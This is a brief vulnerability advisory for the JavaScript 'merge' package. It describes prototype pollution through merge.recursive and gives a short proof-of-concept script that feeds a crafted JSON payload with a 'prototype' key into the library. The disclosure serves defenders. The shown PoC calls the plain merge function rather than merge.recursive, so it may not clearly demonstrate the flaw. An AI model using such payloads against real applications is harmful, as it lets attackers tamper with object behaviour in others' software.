# Overview
`merge` is used to merge multiple objects into one object.

Affected versions of this package are vulnerable to Prototype Pollution via the `merge.recursive` function. 
It can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.


# Proof of Concept

```js
var mergelib = require('merge');

var obj = mergelib({}, JSON.parse('{ "testProperty": "hi", "prototype" : { "status" : "pwned!" } }'));
console.log(obj.prototype.status);
```
